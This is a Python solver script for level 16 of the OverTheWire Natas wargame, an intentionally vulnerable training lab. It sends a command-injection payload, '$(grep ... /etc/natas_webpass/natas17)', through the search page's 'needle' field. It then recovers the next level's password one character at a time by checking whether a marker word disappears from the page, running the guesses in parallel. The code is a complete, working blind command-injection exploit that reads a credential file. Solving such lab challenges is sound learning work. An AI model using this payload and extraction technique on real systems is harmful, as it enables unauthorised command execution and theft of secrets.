import requests
from natas_utility import *
from joblib import Parallel, delayed
import multiprocessing
import time

current_level = 16
credentials = get_credentials(current_level)

base_url = 'http://{}.natas.labs.overthewire.org'.format(credentials['username'])
auth = (credentials['username'], credentials['password'])

session = requests.session()

url = base_url

chars = '0123456789' + 'etaoinshrdlcumwfgypbvkjxqz' + 'etaoinshrdlcumwfgypbvkjxqz'.upper()

desired_len = 32


def get_letter(i):
    for candidate in chars:
        password_candidate = '{}'.format('.' * i + candidate + '.' * (desired_len - i - 1))

        data = {'needle': 'tritest$(grep {} /etc/natas_webpass/natas17)'.format(password_candidate),
                'submit': 'submit'}
        response = session.post(url, data=data, auth=auth)

        if b'tritest' not in response.content:
            return candidate


now = time.time()
inputs = range(0, 32)
num_cores = multiprocessing.cpu_count()
full_results = Parallel(n_jobs=num_cores)(delayed(get_letter)(j) for j in inputs)

next_password = ''.join(full_results)

print('found {} in {} seconds'.format(next_password, time.time() - now))

save_credentials(current_level + 1, next_password)
